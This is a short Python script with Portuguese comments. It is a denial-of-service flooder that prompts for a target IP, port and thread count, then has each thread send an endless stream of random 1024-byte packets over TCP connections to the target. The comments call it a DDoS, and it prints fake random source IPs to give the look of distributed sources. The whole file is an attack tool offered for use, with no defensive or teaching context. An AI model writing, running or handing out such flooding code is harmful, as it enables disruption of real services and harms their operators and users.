import socket
import threading
import random
import time

# Função para simular IPs diferentes
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função de ataque
def attack(ip, port, attack_id):
    try:
        # Criar um socket para o ataque
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Tempo limite para a conexão
        
        # Conectar ao IP e porta de destino
        sock.connect((ip, port))
        print(f"Ataque {attack_id} enviado de {generate_random_ip()} para {ip}:{port} - Sucesso!")

        # Enviar pacotes repetidamente para o alvo (simulando um DDoS)
        while True:
            sock.sendto(random._urandom(1024), (ip, port))  # Enviar dados aleatórios
            time.sleep(0.1)  # Controle de tempo entre os pacotes
            print(f"Ataque {attack_id} em andamento para {ip}:{port}...")
    
    except socket.error as e:
        print(f"Ataque {attack_id} falhou para {ip}:{port} - Erro: {str(e)}")

# Função principal para iniciar o ataque
def start_attack(target_ip, target_port, num_threads):
    print("Iniciando ataque...")
    threads = []
    
    for i in range(num_threads):
        # Criando threads para enviar pacotes em paralelo
        thread = threading.Thread(target=attack, args=(target_ip, target_port, i + 1))
        threads.append(thread)
        thread.start()

    # Espera todas as threads terminarem
    for thread in threads:
        thread.join()

    print("Ataque concluído com sucesso!")

# Solicitando ao usuário o IP e porta de destino
target_ip = input("Digite o IP do destino (ex: 192.168.1.1): ")
target_port = int(input("Digite a porta do destino (ex: 80): "))
num_threads = int(input("Digite o número de threads para o ataque: "))

# Iniciando o ataque com os parâmetros fornecidos
start_attack(target_ip, target_port, num_threads)
